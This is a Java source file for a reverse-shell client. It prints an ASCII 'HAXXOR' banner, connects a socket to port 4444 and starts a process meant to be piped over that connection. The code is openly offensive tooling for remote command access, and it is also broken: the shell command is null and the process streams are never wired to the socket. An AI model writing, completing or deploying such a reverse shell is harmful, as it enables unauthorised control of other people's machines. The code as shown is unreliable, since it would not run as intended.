package dev.drzymala.reversesheller;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;

public class ClientReverseShell {

    public static void main(String[] args) throws IOException {

        System.out.println("");
        System.out.print("8 8888        8          .8.          `8.`8888.      ,8' `8.`8888.      ,8'  ,o888888o.     8 888888888o.\n");
        System.out.print("8 8888        8         .888.          `8.`8888.    ,8'   `8.`8888.    ,8'. 8888     `88.   8 8888    `88.\n");
        System.out.print("8 8888        8        :88888.          `8.`8888.  ,8'     `8.`8888.  ,8',8 8888       `8b  8 8888     `88\n");
        System.out.print("8 8888        8       . `88888.          `8.`8888.,8'       `8.`8888.,8' 88 8888        `8b 8 8888     ,88\n");
        System.out.print("8 8888        8      .8. `88888.          `8.`88888'         `8.`88888'  88 8888         88 8 8888.   ,88'  \n");
        System.out.print("8 8888        8     .8`8. `88888.         .88.`8888.         .88.`8888.  88 8888         88 8 888888888P'   \n");
        System.out.print("8 8888888888888    .8' `8. `88888.       .8'`8.`8888.       .8'`8.`8888. 88 8888        ,8P 8 8888`8b       \n");
        System.out.print("8 8888        8   .8'   `8. `88888.     .8'  `8.`8888.     .8'  `8.`8888.`8 8888       ,8P  8 8888 `8b.     \n");
        System.out.print("8 8888        8  .888888888. `88888.   .8'    `8.`8888.   .8'    `8.`8888.` 8888     ,88'   8 8888   `8b.   \n");
        System.out.print("8 8888        8 .8'       `8. `88888. .8'      `8.`8888. .8'      `8.`8888.  `8888888P'     8 8888     `88.\n");
        System.out.println("");

        connect();
    }

    private static void connect() throws IOException {

        Process remoteShell;
        byte[] buffer = new byte[1024];
        InetSocketAddress serverAddress = new InetSocketAddress("0.0.0.0", 4444);

        try {
            String prompt = null;
            Socket client = new Socket();
            client.connect(serverAddress);
            remoteShell = new ProcessBuilder(prompt).redirectInput(ProcessBuilder.Redirect.PIPE)
                    .redirectOutput(ProcessBuilder.Redirect.PIPE).redirectError(ProcessBuilder.Redirect.PIPE).start();
            OutputStream stdin = remoteShell.getOutputStream();
            InputStream stdout = remoteShell.getInputStream();
            InputStream stderr = remoteShell.getErrorStream();

        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
